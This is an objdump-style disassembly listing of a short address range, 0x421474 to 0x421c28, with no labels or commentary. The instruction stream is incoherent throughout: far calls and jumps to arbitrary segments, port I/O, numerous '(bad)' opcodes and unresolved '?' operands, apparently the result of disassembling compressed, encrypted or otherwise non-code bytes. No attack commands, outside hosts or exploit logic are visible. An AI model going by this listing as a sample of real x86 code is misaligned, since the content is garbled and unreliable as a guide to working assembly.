  421474:	or     al,BYTE PTR [edx-0x8]
  421477:	ins    BYTE PTR es:[edi],dx
  421478:	dec    edi
  421479:	mov    edx,0x645f23fc
  42147e:	shl    DWORD PTR [edx],cl
  421480:	push   edi
  421481:	inc    ebp
  421482:	xlat   BYTE PTR ds:[ebx]
  421483:	mov    edx,0xc17deeff
  421488:	mov    edx,0xe9132783
  42148d:	popf   
  42148e:	into   
  42148f:	cs call 0x7c20:0x9f0eeb72
  421497:	loop   0x4214b1
  421499:	dec    ebp
  42149a:	idiv   DWORD PTR [esi+eax*8+0x1d31ed39]
  4214a1:	or     cl,cl
  4214a3:	mov    edx,0x9da99f89
  4214a8:	imul   ecx,DWORD PTR [edx+0x52b8cd02],0xc6f8a429
  4214b2:	adc    cl,BYTE PTR ds:0xdbfa12eb
  4214b8:	fwait
  4214b9:	mov    dh,0xe1
  4214bb:	aas    
  4214bc:	bound  edi,QWORD PTR [eax+0x9c1ff8b]
  4214c2:	mov    edi,fs
  4214c4:	and    esp,DWORD PTR [eax]
  4214c6:	bound  eax,QWORD PTR [ebx]
  4214c8:	xor    DWORD PTR [edx-0x3d],esi
  4214cb:	aad    0xc3
  4214cd:	bound  edx,QWORD PTR [edx-0x80]
  4214d0:	adc    al,0x3c
  4214d2:	fst    QWORD PTR [ebp-0x37a76db]
  4214d8:	cmp    DWORD PTR [edx+0x10],edx
  4214db:	aam    0x29
  4214dd:	test   eax,0xa2343382
  4214e2:	cmp    eax,0x7e44f7a8
  4214e7:	sar    DWORD PTR ss:[ebx+0x3f543605],cl
  4214ee:	cdq    
  4214ef:	xor    eax,0x58a527c0
  4214f4:	imul   eax,esi,0x8ebc2fd6
  4214fa:	adc    dl,BYTE PTR [ebx+edi*8]
  4214fd:	mov    ebx,ecx
  4214ff:	mov    ds:0x132864fe,al
  421504:	out    0x55,al
  421506:	mov    eax,0x21f76876
  42150b:	shl    al,0xac
  42150e:	loop   0x4214fe
  421510:	add    BYTE PTR [eax+eax*8-0x1],bh
  421514:	mov    edi,0x246ba6dc
  421519:	les    edx,FWORD PTR [edx]
  42151b:	les    ebx,FWORD PTR [edx+0x798363bb]
  421521:	xchg   DWORD PTR ds:[ebp-0x1d659ee4],esp
  421528:	push   edi
  421529:	push   0xc0f8dd
  42152e:	(bad)  
  42152f:	jns    0x4214d8
  421531:	dec    edi
  421532:	pop    edx
  421533:	cmp    ecx,DWORD PTR [ebp+0x20]
  421536:	fsubr  st(2),st
  421538:	in     al,dx
  421539:	or     BYTE PTR [eax+0x15],0x31
  42153d:	ins    BYTE PTR es:[edi],dx
  42153e:	mov    eax,ds:0xf79d6c71
  421543:	xor    eax,0x2673078b
  421548:	dec    esi
  421549:	xor    DWORD PTR [edx],edx
  42154b:	lds    edx,FWORD PTR [eax+0x7d]
  42154e:	sbb    bl,bl
  421550:	dec    eax
  421551:	sub    al,0xab
  421553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421554:	inc    eax
  421555:	popf   
  421556:	xlat   BYTE PTR ds:[ebx]
  421557:	aas    
  421558:	or     bl,0xc8
  42155b:	mov    DWORD PTR [ecx],edx
  42155d:	fwait
  42155e:	aad    0x34
  421560:	pop    eax
  421561:	fisubr DWORD PTR [ebx]
  421563:	ja     0x42158d
  421565:	imul   ecx,DWORD PTR [ebx],0xffffff97
  421568:	scas   al,BYTE PTR es:[edi]
  421569:	mov    ah,0x94
  42156b:	mov    DWORD PTR [ebx],eax
  42156d:	rcl    DWORD PTR [ecx+0x3b],0xad
  421571:	or     bl,dh
  421573:	(bad)  
  421574:	xchg   esi,eax
  421575:	jb     0x421551
  421577:	stos   BYTE PTR es:[edi],al
  421578:	and    BYTE PTR [ebx+ebx*2+0x4f],ch
  42157c:	imul   ebx,DWORD PTR [esi+0x7f999ee3],0x38
  421583:	or     al,0xf0
  421585:	test   BYTE PTR [edx+0xc3dac57],ah
  42158b:	xchg   ecx,eax
  42158c:	sub    eax,DWORD PTR [edi]
  42158e:	fs push 0x1
  421591:	jmp    0x421533
  421593:	xor    DWORD PTR [edi],ecx
  421595:	std    
  421596:	dec    edi
  421597:	pop    ebx
  421598:	and    ecx,esp
  42159a:	jl     0x4215dc
  42159c:	mov    edi,0xcacc9bd9
  4215a1:	fld    st(7)
  4215a3:	inc    esi
  4215a4:	call   0xc319d013
  4215a9:	or     DWORD PTR [edx+0x481c74fa],esp
  4215af:	adc    al,0xaf
  4215b1:	cmp    ah,BYTE PTR [edx]
  4215b3:	aad    0x2e
  4215b5:	inc    edi
  4215b6:	ror    DWORD PTR [eax+edi*8+0x1fad4faa],cl
  4215bd:	rcl    DWORD PTR [esi],1
  4215bf:	cmp    al,BYTE PTR [ecx+0x12cd8acd]
  4215c5:	int3   
  4215c6:	xchg   edi,eax
  4215c7:	(bad)
  4215ca:	jb     0x421593
  4215cc:	inc    ebp
  4215cd:	adc    al,0xd1
  4215cf:	inc    ebp
  4215d0:	sbb    eax,0xcf3d423e
  4215d5:	add    eax,0x72422b77
  4215da:	and    edx,edx
  4215dc:	out    dx,eax
  4215dd:	stos   DWORD PTR es:[edi],eax
  4215de:	push   0xffffffd2
  4215e0:	push   es
  4215e1:	jecxz  0x421614
  4215e3:	xchg   ebp,eax
  4215e4:	in     al,0x13
  4215e6:	or     DWORD PTR [ebx-0x7],eax
  4215e9:	pop    ecx
  4215ea:	jecxz  0x421634
  4215ec:	nop
  4215ed:	mov    dh,0xdc
  4215ef:	pusha  
  4215f0:	cmp    eax,0xcf529645
  4215f5:	mov    ch,0x9e
  4215f7:	push   eax
  4215f8:	cmc    
  4215f9:	jg     0x421675
  4215fb:	(bad)  
  4215fc:	sti    
  4215fd:	cs js  0x4215b0
  421600:	mov    bh,0x80
  421602:	cmp    BYTE PTR [ebx+0x30],0xa5
  421606:	iret   
  421607:	xchg   cl,dh
  421609:	retf   
  42160a:	pop    es
  42160b:	int3   
  42160c:	add    BYTE PTR es:[eax+edi*1],ah
  421610:	xor    ebp,DWORD PTR [edi]
  421612:	mov    cl,0xaa
  421614:	sbb    ah,0x85
  421617:	inc    edx
  421618:	popa   
  421619:	push   eax
  42161a:	test   eax,0x7af19505
  42161f:	and    al,0x82
  421621:	out    dx,al
  421622:	ja     0x421674
  421624:	int3   
  421625:	jmp    0x421670
  421627:	fist   DWORD PTR [ecx]
  421629:	jo     0x42164b
  42162b:	inc    edi
  42162c:	shl    BYTE PTR [edi],cl
  42162e:	daa    
  42162f:	nop
  421630:	cmp    esp,edx
  421632:	add    BYTE PTR [ecx+0x12],dh
  421635:	jne    0x42166f
  421637:	lods   al,BYTE PTR ds:[esi]
  421638:	jne    0x42167d
  42163a:	lea    esi,[eax]
  42163c:	sub    bh,BYTE PTR [ebx+0x42]
  42163f:	mov    ch,0xa
  421641:	(bad)  
  421643:	pop    eax
  421644:	dec    ecx
  421645:	mov    BYTE PTR [esi+0x16639e34],cl
  42164b:	icebp  
  42164c:	scas   eax,DWORD PTR es:[edi]
  42164d:	mov    ebx,0xe9a1c45a
  421652:	dec    edx
  421653:	repnz popf 
  421655:	mov    esp,0xb908b5b4
  42165a:	lea    edi,[esi-0x6c]
  42165d:	ds fcmovb st,st(5)
  421660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421661:	dec    ebp
  421662:	jns    0x421610
  421664:	ret    
  421665:	inc    edx
  421666:	mov    eax,ds:0x1c5d3f13
  42166b:	loop   0x4216db
  42166d:	jae    0x421666
  42166f:	fistp  WORD PTR [ebx-0x6ee212d2]
  421675:	lock sahf 
  421677:	hlt    
  421678:	mov    bh,0x98
  42167a:	mov    bh,0xa8
  42167c:	jl     0x4216ec
  42167e:	xchg   edx,eax
  42167f:	jg     0x4216b0
  421681:	jle    0x421702
  421683:	jle    0x4216d4
  421685:	jmp    0x4216f5
  421687:	addr16 xchg esi,eax
  421689:	adc    ebx,DWORD PTR [ebx+0x70]
  42168c:	sbb    ebp,DWORD PTR [edi-0x7a]
  42168f:	sbb    al,0xcc
  421691:	push   ss
  421692:	lods   al,BYTE PTR ds:[esi]
  421693:	std    
  421694:	test   al,0xb1
  421696:	pop    es
  421697:	lock jns 0x421718
  42169a:	inc    eax
  42169b:	push   ds
  42169c:	enter  0xd9ec,0xb5
  4216a0:	mov    edi,0x920c0ace
  4216a5:	add    BYTE PTR [esi],bh
  4216a7:	out    0xa9,eax
  4216a9:	fmul   QWORD PTR [ebp-0x2f]
  4216ac:	adc    al,0x10
  4216ae:	xchg   DWORD PTR [ecx+0x26],ebp
  4216b1:	cmp    eax,DWORD PTR [edx-0x40264d81]
  4216b7:	xchg   ecx,eax
  4216b8:	pop    ecx
  4216ba:	in     al,0x75
  4216bc:	int3   
  4216bd:	push   0x4f3c6613
  4216c2:	or     eax,0x3b31903f
  4216c7:	cld    
  4216c8:	inc    esp
  4216c9:	ss add BYTE PTR es:[edx],0x37
  4216ce:	pop    ecx
  4216cf:	imul   edi,DWORD PTR [edx+0x661c20de],0x45546209
  4216d9:	mov    WORD PTR [ebp-0x43],?
  4216dc:	or     al,BYTE PTR [esi+0x5cdfc8df]
  4216e2:	xor    al,0xc
  4216e4:	or     ch,BYTE PTR [ecx-0x7c2349e0]
  4216ea:	pop    ebp
  4216eb:	out    0x55,al
  4216ed:	xchg   edx,eax
  4216ee:	imul   ecx,eax,0x3a
  4216f1:	cli    
  4216f2:	(bad)  
  4216f3:	rcr    BYTE PTR [ebx],0xa3
  4216f6:	push   ds
  4216f7:	push   edi
  4216f8:	mov    edi,0x8a8f252d
  4216fd:	ret    0x8512
  421700:	fs pop ds
  421702:	(bad)  
  421703:	xchg   edx,eax
  421704:	test   al,0xac
  421706:	push   cs
  421707:	xor    dh,dl
  421709:	xchg   ebx,eax
  42170a:	xor    BYTE PTR [edx+0x3d5ef496],al
  421710:	mov    al,ds:0xb7bf7421
  421715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421716:	mov    ds:0x1d6a4616,eax
  42171b:	icebp  
  42171c:	mov    eax,ds:0x2aa270a4
  421721:	mov    DWORD PTR [ebx+0x6233fe03],esi
  421727:	adc    BYTE PTR [ebp-0x36],bh
  42172a:	mov    edi,0xb86e964f
  42172f:	fdiv   QWORD PTR [ecx+0x57]
  421732:	ins    DWORD PTR es:[edi],dx
  421733:	or     eax,0x1f66b5ec
  421738:	xor    BYTE PTR [ebp-0x38],dl
  42173b:	mov    bh,0x70
  42173d:	pop    esp
  42173e:	repz pop ds
  421740:	inc    esp
  421741:	fimul  WORD PTR [ebx]
  421743:	add    BYTE PTR [eax],cl
  421745:	loopne 0x421722
  421747:	cmp    bl,BYTE PTR [esi*1+0x70df5285]
  42174e:	ins    DWORD PTR es:[edi],dx
  42174f:	mov    BYTE PTR [ebx],ah
  421751:	nop
  421752:	pop    ebx
  421753:	jmp    0xf323:0xfac63c37
  42175a:	sbb    eax,DWORD PTR [ebp+0x6e]
  42175d:	mov    eax,ds:0x88f44e4b
  421762:	sahf   
  421763:	imul   BYTE PTR [ebx]
  421765:	mov    bl,BYTE PTR [edx]
  421767:	lahf   
  421768:	jp     0x4217c3
  42176a:	adc    BYTE PTR ss:[ebx],bh
  42176d:	mov    edx,0xbfcf0dda
  421772:	add    al,0xa1
  421774:	jl     0x421788
  421776:	jmp    0x2497ce9
  42177b:	mov    BYTE PTR [ebx],bh
  42177d:	pop    esi
  42177e:	xchg   ecx,eax
  42177f:	sub    esp,esp
  421781:	int    0xd5
  421783:	lock xchg esp,eax
  421785:	int3   
  421786:	sar    ebp,0xa0
  421789:	lds    ecx,FWORD PTR [edx-0x45ba6645]
  42178f:	shl    BYTE PTR [esi+0x78],1
  421792:	ins    DWORD PTR es:[edi],dx
  421793:	dec    esi
  421794:	cmp    eax,0x383db652
  421799:	out    dx,al
  42179a:	(bad)  
  42179b:	les    eax,FWORD PTR [eax]
  42179d:	ins    BYTE PTR es:[edi],dx
  42179e:	mul    ebp
  4217a0:	outs   dx,DWORD PTR ds:[esi]
  4217a1:	push   ebx
  4217a2:	xor    ecx,DWORD PTR fs:[eax]
  4217a5:	(bad)  
  4217a6:	out    dx,eax
  4217a7:	pop    es
  4217a8:	jl     0x4217e1
  4217aa:	adc    al,0x9d
  4217ac:	std    
  4217ad:	(bad)  
  4217af:	cmp    edx,ebp
  4217b1:	jmp    0x4217db
  4217b3:	pop    ebp
  4217b4:	dec    ecx
  4217b5:	dec    DWORD PTR [esi+0x3e90d7b7]
  4217bb:	mov    cl,0x3c
  4217bd:	xchg   esi,eax
  4217be:	mov    BYTE PTR [edx-0x1cec4da4],0xa2
  4217c5:	push   ebx
  4217c6:	lock sub eax,0xac8ed94
  4217cc:	ja     0x421821
  4217ce:	call   0x856b008a
  4217d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d4:	lods   eax,DWORD PTR ds:[esi]
  4217d5:	scas   eax,DWORD PTR es:[edi]
  4217d6:	mov    cl,0xbc
  4217d8:	pop    esi
  4217d9:	mov    DWORD PTR [ecx+esi*1-0x2b10a71d],ecx
  4217e0:	mov    ebx,0x12c3e481
  4217e5:	sti    
  4217e6:	jnp    0x421809
  4217e8:	add    BYTE PTR [esi+0x14],0x89
  4217ec:	fist   DWORD PTR [ecx+edi*2]
  4217ef:	add    al,0xf3
  4217f1:	xchg   ebp,eax
  4217f2:	adc    al,0xe8
  4217f4:	dec    esp
  4217f5:	ins    BYTE PTR es:[edi],dx
  4217f6:	ins    BYTE PTR es:[edi],dx
  4217f7:	mov    ecx,0x1ac36754
  4217fc:	and    eax,0x7b4e62cc
  421801:	imul   ebx,DWORD PTR [edx+0x1fc27ebe],0x2e
  421808:	inc    esi
  421809:	mov    cl,dl
  42180b:	into   
  42180c:	dec    ebx
  42180d:	into   
  42180e:	mov    eax,0xd062248a
  421813:	and    ah,al
  421815:	ss dec ecx
  421817:	jne    0x4217bc
  421819:	int    0x9a
  42181b:	mov    BYTE PTR [edx+esi*4-0x21bc7b10],dl
  421822:	dec    ebx
  421823:	das    
  421824:	retf   0xbbe8
  421827:	or     eax,0x5ef87e73
  42182c:	scas   al,BYTE PTR es:[edi]
  42182d:	jmp    0x4217d9
  42182f:	inc    edi
  421830:	test   eax,0x5f6c0603
  421835:	or     dl,ah
  421837:	xchg   ebx,eax
  421838:	mov    ds:0x7ed3f3e1,al
  42183d:	das    
  42183e:	pop    edx
  42183f:	mov    dl,0x75
  421841:	addr16 repz xor edx,esp
  421845:	mov    ds:0x172fb640,al
  42184a:	fcmovb st,st(5)
  42184c:	loopne 0x4217d8
  42184e:	jb     0x42185c
  421850:	mov    ds:0x3c00251c,eax
  421855:	or     BYTE PTR [edx],0x3f
  421858:	push   ecx
  421859:	mov    edx,0x7cc4b793
  42185e:	fisttp QWORD PTR [edi+0x71]
  421861:	gs mov ebp,0x1a057c03
  421867:	inc    eax
  421868:	ud0    ebp,DWORD PTR [esi]
  42186b:	enter  0x51e1,0x27
  42186f:	mov    bl,0xf2
  421871:	test   DWORD PTR [ebp-0x1dbc9e7f],edx
  421877:	jmp    0xdf0f:0x78a79419
  42187e:	stc    
  42187f:	xchg   esi,eax
  421880:	add    DWORD PTR ds:[ebx*4+0x15516083],edi
  421888:	mov    ebx,0x71599319
  42188d:	sbb    BYTE PTR [eax-0x51],al
  421890:	rcr    ebx,cl
  421892:	and    eax,0xe4bf9a8c
  421897:	popf   
  421898:	xor    eax,0x5d8a351a
  42189d:	xor    dh,BYTE PTR [ebx-0x72947e28]
  4218a3:	test   al,0x86
  4218a5:	popf   
  4218a6:	cmp    al,0x50
  4218a8:	cdq    
  4218a9:	mov    ch,0x22
  4218ab:	sar    DWORD PTR [ebx],0x7
  4218ae:	sbb    ebx,ebp
  4218b0:	mov    dl,0x3e
  4218b2:	sahf   
  4218b3:	sub    bh,BYTE PTR [ebx-0x7f]
  4218b6:	sbb    DWORD PTR [ecx-0x58db14d9],esi
  4218bc:	retf   
  4218bd:	and    DWORD PTR [edx-0x16],ecx
  4218c0:	pop    ecx
  4218c1:	adc    DWORD PTR [ebx],esi
  4218c3:	mov    al,ds:0x1907a74a
  4218c8:	xchg   BYTE PTR [edi-0x5e],bh
  4218cb:	fcmove st,st(4)
  4218cd:	xchg   ecx,eax
  4218ce:	cmp    eax,0xb48b3833
  4218d3:	hlt    
  4218d4:	mov    ebx,0xf8f17277
  4218d9:	cmp    al,0x94
  4218db:	scas   al,BYTE PTR es:[edi]
  4218dc:	adc    bl,cl
  4218de:	add    DWORD PTR [esi+0x59],0xffffffbb
  4218e2:	les    edx,FWORD PTR [eax+0x40ad767f]
  4218e8:	iret   
  4218e9:	icebp  
  4218ea:	cmp    esp,DWORD PTR [ecx+0x2d]
  4218ed:	aam    0xe7
  4218ef:	retf   0xe7a7
  4218f2:	adc    eax,0x738defda
  4218f7:	push   ecx
  4218f8:	sub    edx,DWORD PTR [ebx-0x2b]
  4218fb:	fs pop eax
  4218fd:	pop    ds
  4218fe:	xchg   esi,eax
  4218ff:	sub    DWORD PTR [esi-0xb571a3b],eax
  421905:	stc    
  421906:	or     DWORD PTR [ebp+eiz*4+0x7a08d7fc],eax
  42190d:	shr    DWORD PTR [ecx-0x10],1
  421910:	test   dl,dh
  421912:	xchg   BYTE PTR ds:0xafc8edd5,cl
  421918:	jo     0x421998
  42191a:	repnz into 
  42191c:	xchg   ecx,eax
  42191d:	rcr    bl,0x4d
  421920:	int    0x16
  421922:	cmp    DWORD PTR [eax-0xb],ecx
  421925:	sbb    BYTE PTR [esi+0x56],dl
  421928:	add    cl,dh
  42192a:	push   0x45f98369
  42192f:	or     esi,ebx
  421931:	rol    BYTE PTR [ebx],0x78
  421934:	in     al,0xde
  421936:	fisub  WORD PTR [esi+0x45]
  421939:	cs dec esp
  42193b:	(bad)  
  42193c:	fdiv   DWORD PTR [ebx+0x54]
  42193f:	cmp    ah,BYTE PTR [ebx+0x654e4687]
  421945:	sub    DWORD PTR [ebp+0x4e],eax
  421948:	fistp  DWORD PTR [ebx-0x18]
  42194b:	mov    dh,0x5d
  42194d:	jle    0x42198e
  42194f:	ins    BYTE PTR es:[edi],dx
  421950:	shr    BYTE PTR [edi],1
  421952:	and    eax,0x9b5f4522
  421957:	or     BYTE PTR [edi+0x72db4351],bh
  42195d:	data16 jbe 0x4219d7
  421960:	aaa    
  421961:	pushf  
  421962:	or     BYTE PTR [edi+edi*1+0x6],bh
  421966:	cwde   
  421967:	sub    eax,0x28f77ded
  42196c:	addr16 sub ah,bl
  42196f:	scas   eax,DWORD PTR es:[edi]
  421970:	(bad)  
  421971:	jl     0x421904
  421973:	repz stc 
  421975:	lods   al,BYTE PTR ds:[esi]
  421976:	mov    dh,BYTE PTR [ebp+0x4d]
  421979:	inc    edx
  42197a:	push   ds
  42197b:	fwait
  42197c:	xchg   edx,eax
  42197d:	in     al,0xdc
  42197f:	popf   
  421980:	pop    esi
  421981:	js     0x4219ca
  421983:	cmp    DWORD PTR [edi],edx
  421985:	in     al,0x7a
  421987:	and    eax,0xfe477b68
  42198c:	pop    ecx
  42198d:	mov    bh,0x87
  42198f:	ins    BYTE PTR es:[edi],dx
  421990:	jo     0x421958
  421992:	aas    
  421993:	sub    BYTE PTR ds:0x8666032b,dh
  421999:	ss daa 
  42199b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42199c:	adc    ah,al
  42199e:	pushf  
  42199f:	or     WORD PTR [edx+0x52],dx
  4219a3:	mov    WORD PTR [ebx+0x53],fs
  4219a6:	iret   
  4219a7:	pop    eax
  4219a8:	pop    ds
  4219a9:	out    0xe4,eax
  4219ab:	cmp    DWORD PTR es:[esi+0x4ab38724],edi
  4219b2:	stos   BYTE PTR es:[edi],al
  4219b3:	fdiv   QWORD PTR [edx]
  4219b5:	jg     0x4219cc
  4219b7:	inc    esi
  4219b8:	xchg   ebp,eax
  4219b9:	clc    
  4219ba:	iret   
  4219bb:	mov    ecx,0xd24d397b
  4219c0:	lock jb 0x4219e1
  4219c3:	fadd   st,st(7)
  4219c5:	rol    BYTE PTR [ebx+0x1644bfe7],1
  4219cb:	or     eax,0x8b9aa0e7
  4219d0:	xchg   ebx,eax
  4219d1:	cmp    DWORD PTR [ebx],0xae954141
  4219d7:	int    0xdb
  4219d9:	or     eax,0x342deab4
  4219de:	sbb    dl,cl
  4219e0:	aas    
  4219e1:	es jne 0x42197d
  4219e4:	loopne 0x42199a
  4219e6:	xchg   ebx,eax
  4219e7:	jp     0x4219d5
  4219e9:	mov    ah,0xb4
  4219eb:	sub    al,0xbd
  4219ed:	(bad)  
  4219ee:	jnp    0x4219c2
  4219f0:	xor    al,0x40
  4219f2:	jae    0x421a24
  4219f4:	jb     0x4219a3
  4219f6:	pop    ecx
  4219f7:	fild   QWORD PTR [ebx+0x5f]
  4219fa:	out    0x46,eax
  4219fc:	cmp    al,0xe7
  4219fe:	mov    al,ah
  421a00:	out    0x37,al
  421a02:	and    dl,BYTE PTR [ebx+0x1754fa35]
  421a08:	addr16 pop esi
  421a0a:	jo     0x4219c5
  421a0c:	mov    al,0x16
  421a0e:	fld    QWORD PTR [ecx-0x1e]
  421a11:	pop    ax
  421a13:	sub    eax,0x1769cbb
  421a18:	inc    esi
  421a19:	xor    eax,edx
  421a1b:	je     0x421a6c
  421a1d:	add    ecx,ecx
  421a1f:	loop   0x4219cc
  421a21:	dec    esp
  421a22:	adc    al,0xb1
  421a24:	aas    
  421a25:	push   0xffffffbd
  421a27:	lahf   
  421a28:	fadd   DWORD PTR [eax+0x2a2b6b36]
  421a2e:	or     al,0x7f
  421a30:	in     eax,dx
  421a31:	dec    edx
  421a33:	stos   BYTE PTR es:[edi],al
  421a34:	jbe    0x421a70
  421a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a37:	xchg   esi,eax
  421a38:	push   ebx
  421a39:	loop   0x421a59
  421a3b:	cli    
  421a3c:	lds    edi,FWORD PTR [edi]
  421a3e:	adc    BYTE PTR [edi],dh
  421a40:	jnp    0x421a5c
  421a42:	jmp    0x317491f9
  421a47:	add    BYTE PTR [edi+0x34],0x4b
  421a4b:	xlat   BYTE PTR ds:[ebx]
  421a4c:	mov    cl,0x8e
  421a4e:	cli    
  421a4f:	push   DWORD PTR [eax-0x76]
  421a52:	sbb    BYTE PTR [ecx+ebp*8-0x2],ch
  421a56:	fist   WORD PTR [eax]
  421a58:	dec    ecx
  421a59:	(bad)  
  421a5a:	push   cs
  421a5b:	pop    esi
  421a5c:	daa    
  421a5d:	inc    edx
  421a5e:	jmp    0xdd0e:0x3457556c
  421a65:	cdq    
  421a66:	jae    0x421ab1
  421a68:	mov    edi,0xbb39ef85
  421a6d:	ja     0x421a05
  421a6f:	inc    esi
  421a70:	clc    
  421a71:	loop   0x421a37
  421a73:	xor    eax,0x48260fc2
  421a78:	push   ebx
  421a79:	fld    QWORD PTR [edx+ebx*1+0x4a56b45b]
  421a80:	adc    eax,0xb0195595
  421a85:	push   cs
  421a86:	and    BYTE PTR ds:0xc49c9c87,al
  421a8c:	fsubp  st(4),st
  421a8e:	imul   ecx,DWORD PTR [ebp+0xe9e4c2c],0x25
  421a95:	push   0xffffffe6
  421a97:	ins    BYTE PTR es:[edi],dx
  421a98:	xchg   BYTE PTR [ecx+0x59fa216c],bh
  421a9e:	mov    ?,edi
  421aa0:	or     esp,ecx
  421aa2:	or     ch,BYTE PTR [edx-0xc]
  421aa5:	test   BYTE PTR [edx-0x15],ah
  421aa8:	fwait
  421aa9:	retf   0x7ec2
  421aac:	sti    
  421aad:	dec    edx
  421aae:	(bad)  
  421ab0:	cmp    ebp,DWORD PTR [edi+0x62]
  421ab3:	es sbb eax,0x13c78f6c
  421ab9:	std    
  421aba:	imul   ebx,DWORD PTR [edx+0x27db64fd],0xa
  421ac1:	mov    ebx,0x3af4917d
  421ac6:	add    cl,dl
  421ac8:	push   ecx
  421ac9:	in     eax,0xdd
  421acb:	inc    edi
  421acc:	outs   dx,BYTE PTR ds:[esi]
  421acd:	sbb    BYTE PTR [esi],bh
  421acf:	dec    ebx
  421ad0:	popa   
  421ad1:	dec    edi
  421ad2:	gs jmp 0x421b4a
  421ad5:	xor    edx,edi
  421ad7:	mov    ebx,0xe098a309
  421adc:	cwde   
  421add:	jmp    0x6004:0x5cd1ea20
  421ae4:	dec    ebx
  421ae5:	shl    DWORD PTR [eax-0x33],0xd9
  421ae9:	fmul   DWORD PTR [edi+0x40]
  421aec:	scas   al,BYTE PTR es:[edi]
  421aed:	pop    edx
  421aee:	arpl   WORD PTR [ecx],si
  421af0:	mov    esi,DWORD PTR [eax]
  421af2:	cmp    al,0x98
  421af4:	sub    DWORD PTR [ebx+eax*1],edx
  421af7:	push   edx
  421af8:	inc    edx
  421af9:	sub    eax,eax
  421afb:	mov    ebx,ecx
  421afd:	inc    ecx
  421afe:	mov    esp,DWORD PTR [edx+0x17]
  421b01:	loop   0x421b08
  421b03:	lahf   
  421b04:	ret    
  421b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b06:	sbb    DWORD PTR [eax],ebp
  421b08:	and    al,0x9c
  421b0a:	fst    QWORD PTR ds:0xe3c14b03
  421b10:	pop    ebx
  421b11:	pop    esp
  421b12:	cs fld DWORD PTR ss:[edi+0x70]
  421b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b18:	mov    esi,0x89877d41
  421b1d:	xor    BYTE PTR [ecx],dl
  421b1f:	adc    ebx,DWORD PTR [bx+di-0x1b]
  421b23:	push   edi
  421b24:	iret   
  421b25:	inc    esp
  421b26:	clc    
  421b27:	ret    
  421b28:	and    eax,0xcd6a9f56
  421b2d:	lock daa 
  421b2f:	je     0x421b6e
  421b31:	std    
  421b32:	jg     0x421b06
  421b34:	hlt    
  421b35:	mov    BYTE PTR [eax-0x79eaf5ee],ah
  421b3b:	adc    BYTE PTR [edx],bl
  421b3d:	push   ss
  421b3e:	pop    esp
  421b3f:	cmp    DWORD PTR [ecx-0x2d],eax
  421b42:	pop    ss
  421b43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b44:	sbb    eax,DWORD PTR [ebx]
  421b46:	les    edx,FWORD PTR [ebp-0x4d]
  421b49:	shl    DWORD PTR [esi+0x31a21da7],cl
  421b4f:	sahf   
  421b50:	ret    0xb225
  421b53:	stos   DWORD PTR es:[edi],eax
  421b54:	lods   eax,DWORD PTR ds:[esi]
  421b55:	das    
  421b56:	fmul   QWORD PTR [ebp+0x13]
  421b59:	xchg   DWORD PTR [esi-0x7c],ebx
  421b5c:	call   0xaf52:0xd0415e2d
  421b63:	inc    ebp
  421b64:	fisubr WORD PTR [ebx-0x5d1ff9c7]
  421b6a:	add    bh,ah
  421b6c:	lods   eax,DWORD PTR ds:[esi]
  421b6d:	call   DWORD PTR [ebx+0x6537c73c]
  421b73:	adc    dl,BYTE PTR [edi+0x24]
  421b76:	inc    ecx
  421b77:	outs   dx,BYTE PTR ds:[esi]
  421b78:	(bad)  
  421b79:	hlt    
  421b7a:	dec    eax
  421b7b:	jnp    0x421be4
  421b7d:	xor    DWORD PTR [ebp-0x6583765a],edx
  421b83:	aas    
  421b84:	fs jbe 0x421bf9
  421b87:	std    
  421b88:	icebp  
  421b89:	imul   edx,DWORD PTR [eax-0x13e35657],0xffffff86
  421b90:	arpl   WORD PTR [esi],di
  421b92:	stos   BYTE PTR es:[edi],al
  421b93:	out    dx,eax
  421b94:	loop   0x421b3a
  421b96:	pop    ebp
  421b97:	or     eax,0xf29f7a83
  421b9c:	mov    dh,0x20
  421b9e:	sbb    BYTE PTR [edx],bl
  421ba0:	add    al,BYTE PTR [ebp+0x21ea6cfb]
  421ba6:	(bad)  es:[edx-0x58e94728]
  421bad:	ja     0x421b34
  421baf:	cdq    
  421bb0:	inc    BYTE PTR [eax+0x37294cb2]
  421bb6:	in     eax,dx
  421bb7:	dec    eax
  421bb8:	pop    ecx
  421bb9:	nop
  421bba:	dec    ecx
  421bbb:	cdq    
  421bbc:	loope  0x421b95
  421bbe:	or     al,0x37
  421bc0:	add    DWORD PTR [ebx-0x66],eax
  421bc3:	cmp    eax,0xfe4245bd
  421bc8:	inc    ecx
  421bc9:	es lahf 
  421bcb:	inc    esp
  421bcc:	jno    0x421b72
  421bce:	xlat   BYTE PTR ds:[ebx]
  421bcf:	mov    ah,0xde
  421bd1:	sub    al,cl
  421bd3:	(bad)  
  421bd4:	pop    esi
  421bd5:	dec    eax
  421bd6:	and    bh,al
  421bd8:	(bad)  
  421bd9:	fnstsw WORD PTR [ecx]
  421bdb:	ret    0x5369
  421bde:	push   esi
  421bdf:	pop    ebp
  421be0:	leave  
  421be1:	cli    
  421be2:	inc    esi
  421be3:	xchg   edx,eax
  421be4:	or     BYTE PTR [ebx+0x10],bh
  421be7:	je     0x421b85
  421be9:	mov    fs:0xfe77502e,eax
  421bef:	or     bh,dh
  421bf1:	ins    BYTE PTR es:[edi],dx
  421bf2:	or     al,0x4e
  421bf4:	test   ebx,edx
  421bf6:	rol    DWORD PTR [esi-0x61],1
  421bf9:	push   0xffffff84
  421bfb:	stc    
  421bfc:	call   0x155:0xdab99b42
  421c03:	mov    dl,0xea
  421c05:	mov    cl,BYTE PTR [ecx+0x5f]
  421c08:	addr16 out 0xb7,al
  421c0b:	xchg   DWORD PTR [ecx-0x31],esi
  421c0e:	fnstenv [ecx]
  421c10:	mov    edx,0x1fca38df
  421c15:	fwait
  421c16:	cmp    BYTE PTR [ecx-0x4cbe7cfb],bh
  421c1c:	aas    
  421c1d:	stos   DWORD PTR es:[edi],eax
  421c1e:	ror    DWORD PTR [eax-0x37cab7b3],1
  421c24:	inc    edi
  421c25:	or     BYTE PTR [esi],bh
  421c27:	std    
  421c28:	mov    DWORD PTR [ebx+0x7ce68392],edx
